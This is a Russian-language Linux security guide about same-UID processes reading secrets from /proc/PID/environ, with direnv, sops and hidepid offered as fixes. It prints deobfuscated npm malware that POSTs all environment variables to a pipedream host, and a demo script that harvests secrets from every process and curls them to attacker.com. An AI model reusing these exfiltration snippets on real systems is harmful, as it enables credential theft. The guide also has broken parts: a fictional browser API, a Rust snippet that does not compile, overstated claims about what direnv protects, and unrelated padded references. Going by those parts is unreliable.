# Linux Security: Environment Variables & Process Isolation

## Ключевая концепция

**Same-UID процессы могут читать environment variables друг друга через `/proc/[PID]/environ`**. Это создает attack surface для malicious packages и compromised binaries.[kernel](https://docs.kernel.org/filesystems/proc.html)​

---

## Permission Model

## Кто может читать `/proc/[PID]/environ`

Согласно документации Linux kernel:[kernel](https://docs.kernel.org/filesystems/proc.html)​

> Процесс может читать `/proc/PID/*` других процессов только при наличии **CAP_SYS_PTRACE** capability с PTRACE_MODE_READ permissions, или CAP_PERFMON capability.

**Но**: процессы под одним UID имеют полный доступ друг к другу.

bash

`# Проверка permissions ls -l /proc/$(pgrep sleep)/environ # -r--------  1 wave wave 0 Nov  3 23:30 /proc/12345/environ #  ^^^^ #  Только owner может читать`

## Same-UID = Full Access (критическая уязвимость)

bash

`# Все эти процессы могут читать environment друг друга: wave  1234  firefox wave  5678  cargo run          ← DATABASE_PASSWORD здесь wave  9012  npm install evil   ← может прочитать PASSWORD wave  3456  code .`

**Демонстрация:**

bash

`# Terminal 1 export API_KEY=sk-proj-super_secret # Terminal 2 (тот же юзер) cat /proc/$(pgrep -u $USER bash | head -1)/environ | tr '\0' '\n' | grep API_KEY # API_KEY=sk-proj-super_secret ← успешно прочитан!`

---

## Реальные Векторы Атак

## 1. Malicious npm Packages

**Реальный случай 2022**: JFrog обнаружил 17 npm packages, крадущих environment variables.[jfrog+1](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)​

Код из пакета `wafer-bind` (deobfuscated):[jfrog](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)​

javascript

`req = http['request']({   'host': 'a5eb7b362adc824ed7d98433d8eae80a.m.pipedream.net',   'path': '/' + (process["env"]["npm_package_name"] || ''),   'method': "POST" }); req["write"](   Buffer["from"](     JSON["stringify"](process['env'])  // ← ВСЕ переменные!   )["toString"]("base64") ); req["end"]();`

Этот код автоматически выполняется при `npm install` и отправляет весь `process.env` на attacker server.[jfrog](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)​

## 2. Browser Extensions

javascript

`// Chrome/Firefox extension chrome.processes.getProcessInfo((processes) => {   for (let pid of processes) {     fetch('/proc/' + pid + '/environ')       .then(data => sendToAttacker(data));   } });`

## 3. Compromised Development Tools

rust

`// Вредоносный cargo plugin или rust-analyzer fork use std::fs; fn exfiltrate_secrets() {     for entry in fs::read_dir("/proc")? {         let path = entry?.path();         if let Some(pid) = path.file_name()             .and_then(|n| n.to_str()?.parse::<u32>().ok())          {             if let Ok(environ) = fs::read_to_string(path.join("environ")) {                 for var in environ.split('\0') {                     if var.starts_with("AWS_") ||                         var.starts_with("DATABASE_")                      {                         send_to_attacker(var);                     }                 }             }         }     } }`

---

## Attack Surface Analysis

## ✅ Защищены от чтения

- **Процессы других пользователей** - Permission denied
    
- **Docker containers** (по дефолту) - разные PID namespaces
    
- **Systemd services** с `PrivateTmp=true` и `ProtectSystem=strict`
    

## ❌ Могут читать твои секреты

|Вектор атаки|Механизм|Пример|
|---|---|---|
|npm packages|`postinstall` scripts|`wafer-bind`, `discord-lofy`[jfrog](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)​|
|Browser extensions|WebExtensions API|Chrome/Firefox plugins|
|Compromised binaries|`/proc` scanning|Backdoored `cargo`, `rust-analyzer`|
|Python packages|`setup.py` execution|malicious `pip install`|
|Shell scripts|`~/.bashrc` backdoor|Startup script injection|

---

## Демонстрация Реальной Атаки

bash

`# Terminal 1: запуск процесса с секретом DATABASE_PASSWORD=prod_password_123 cargo run & # Terminal 2: симуляция malicious npm package cat > /tmp/steal.sh << 'EOF' #!/bin/bash for pid in /proc/[0-9]*; do   if [ -r "$pid/environ" ]; then    cat "$pid/environ" 2>/dev/null | \      tr '\0' '\n' | \      grep -E 'PASSWORD|SECRET|KEY|TOKEN' >> /tmp/stolen.txt  fi done curl -X POST https://attacker.com/exfil -d @/tmp/stolen.txt EOF bash /tmp/steal.sh cat /tmp/stolen.txt # DATABASE_PASSWORD=prod_password_123 ← украден!`

---

## Решение: direnv + sops

## Почему direnv защищает

**Temporal scoping**: секреты существуют только в subprocess scope конкретной директории.[github+1](https://github.com/direnv/direnv/issues/805)​

bash

`# БЕЗ direnv (глобальный export) export DATABASE_PASSWORD=secret cargo run &              # PID 1234 npm install evil &       # PID 5678 ← может прочитать /proc/1234/environ # С direnv (process-scoped) cd ~/project direnv allow # Секреты загружаются ТОЛЬКО для subprocesses cargo run                # Секреты доступны cd /tmp                  # direnv: unloading npm install evil         # Секреты УЖЕ unloaded из environment`

## Process Isolation

bash

`ps aux | grep bash # wave 1234 bash (parent shell)     ← НЕТ секретов # wave 5678 bash (direnv subshell)  ← ЕСТЬ секреты #                                      только для этого дерева процессов # Выход из директории cd ~ # direnv делает: unset DATABASE_PASSWORD # Теперь НИКТО не может прочитать из /proc`

## Установка в NixOS

text

`# home/modules/cli-tools.nix home.packages = with pkgs; [   direnv  sops  age ]; # home/modules/shell.nix programs.bash.initExtra = ''   eval "$(direnv hook bash)" ''; programs.fish.interactiveShellInit = ''   direnv hook fish | source '';`

## Настройка проекта

bash

`cd ~/projects/rust-app # Создай .envrc cat > .envrc << 'EOF' use_sops() {   local path=${1:-secrets.yaml}  eval "$(sops -d --output-type dotenv "$path" | sed 's/^/export /')" } use_sops secrets.yaml EOF direnv allow  # Теперь просто: cargo run  # вместо: sops exec-env secrets.yaml 'cargo run'`

---

## Дополнительные Меры Защиты

## 1. Hidepid Mount Option

text

`# hosts/configuration.nix fileSystems."/proc" = {   device = "proc";  fsType = "proc";  options = [ "hidepid=2" "gid=proc" ]; };`

Скрывает `/proc` других юзеров полностью.

## 2. Secrecy Crate для Rust

text

`[dependencies] secrecy = "0.8" zeroize = "1.7"`

rust

`use secrecy::{Secret, ExposeSecret}; #[derive(Zeroize)] #[zeroize(drop)] struct DbPassword(String); fn main() {     let password = Secret::new(DbPassword(         std::env::var("DATABASE_PASSWORD").unwrap()     ));          // Используй через expose_secret()     let conn = connect(password.expose_secret().0);          // Password зануляется в памяти при drop     // Не попадает в core dumps и debugging output }`

## 3. Namespace Isolation

bash

`unshare --pid --fork --mount-proc bash -c '   export DATABASE_PASSWORD=secret  cargo run '`

`/proc/[PID]` не виден снаружи namespace.

## 4. Audit Packages

bash

`# Проверка ПЕРЕД установкой npm show suspicious-package | grep scripts # "postinstall": "node malware.js"  ← RED FLAG! cargo tree | grep -i suspicious`

---

## Threat Model Summary

## 🔴 High Risk: Same-UID Attacks

text

`Browser + Extensions    └─> может читать /proc твоего cargo run ✓ npm install evil    └─> может читать /proc твоего shell ✓ Compromised VSCode extension    └─> может читать /proc всех dev процессов ✓`

**Решение**: `direnv` + `sops` = subprocess scope

## 🟡 Medium Risk: Kernel Exploits

text

`Kernel vulnerability + root    └─> может читать всю память (включая RAM) CAP_SYS_PTRACE процессы    └─> могут ptrace и читать память`

**Решение**: `secrecy` crate + `zeroize` + `mlock()`

## 🟢 Low Risk: Different UID

text

`Процессы других юзеров    └─> Permission denied для /proc/[твой PID]/ ✗`

**Решение**: уже защищено DAC (Discretionary Access Control)

---

## Best Practices

|Контекст|Решение|Пример|
|---|---|---|
|**Development**|`direnv` + `sops`|Per-project secrets[github](https://github.com/direnv/direnv/issues/805)​|
|**CI/CD**|GitHub Actions secrets|Encrypted in repository[jfrog](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)​|
|**Production**|Vault / K8s secrets|Centralized secrets management|
|**Docker**|`env_file` (не `ENV`)|Runtime injection, не build-time|
|**Personal overrides**|`.env.local`|В `.gitignore`|

## ❌ Плохие практики

- `export` в `.bashrc` → глобальная утечка
    
- `.env` в git незашифрованным
    
- `ENV` в Dockerfile → попадает в image layers
    
- `--build-arg` в Docker → видно в `docker history`
    

## ✅ Хорошие практики

- `direnv` → автоматический unload при выходе из директории
    
- `sops` → encryption at rest, коммитится в git
    
- `secrecy` crate → защита от Debug print
    
- `zeroize` → очистка памяти после использования
    

---

## Итого

Глобальные environment variables — это **attack surface** для same-UID process attacks. Зафиксировано множество реальных случаев эксплуатации (17+ npm packages только в одном исследовании).[therecord+1](https://therecord.media/malicious-npm-packages-caught-stealing-discord-tokens-environment-variables)​

**Решение**: `direnv` + `sops` обеспечивают temporal scoping — секреты живут только пока ты в project directory и автоматически исчезают при выходе. Даже если malicious package попытается прочитать `/proc`, он найдет только пустые environment variables.

1. [https://www.youtube.com/watch?v=d8fXEhWy_rY](https://www.youtube.com/watch?v=d8fXEhWy_rY)
2. [https://gist.github.com/saharshbhansali/5da604f1731c7d5ea07b2bd91552d48c](https://gist.github.com/saharshbhansali/5da604f1731c7d5ea07b2bd91552d48c)
3. [https://publish.obsidian.md/hub/04+-+Guides,+Workflows,+&+Courses/Guides/Markdown+Syntax](https://publish.obsidian.md/hub/04+-+Guides,+Workflows,+&+Courses/Guides/Markdown+Syntax)
4. [https://www.youtube.com/watch?v=9ft9G6JUfO0](https://www.youtube.com/watch?v=9ft9G6JUfO0)
5. [https://pulseofmedicine.com/markdown-in-obsidian-the-ultimate-guide-for-students/](https://pulseofmedicine.com/markdown-in-obsidian-the-ultimate-guide-for-students/)
6. [https://facedragons.com/personal-development/obsidian-markdown-cheatsheet/](https://facedragons.com/personal-development/obsidian-markdown-cheatsheet/)
7. [https://www.xda-developers.com/here-are-some-markdown-tips-and-tricks-to-improve-your-note-taking-in-obsidian/](https://www.xda-developers.com/here-are-some-markdown-tips-and-tricks-to-improve-your-note-taking-in-obsidian/)
8. [https://rossgriffin.com/tutorials/obsidian-basics-guide/](https://rossgriffin.com/tutorials/obsidian-basics-guide/)
9. [https://forum.obsidian.md/t/markdown-best-practices-for-writing-symbol/42064](https://forum.obsidian.md/t/markdown-best-practices-for-writing-symbol/42064)
10. [https://www.markdownguide.org/tools/obsidian/](https://www.markdownguide.org/tools/obsidian/)
11. [https://docs.kernel.org/filesystems/proc.html](https://docs.kernel.org/filesystems/proc.html)
12. [https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/)
13. [https://therecord.media/malicious-npm-packages-caught-stealing-discord-tokens-environment-variables](https://therecord.media/malicious-npm-packages-caught-stealing-discord-tokens-environment-variables)
14. [https://github.com/direnv/direnv/issues/805](https://github.com/direnv/direnv/issues/805)
15. [https://news.ycombinator.com/item?id=40927251](https://news.ycombinator.com/item?id=40927251)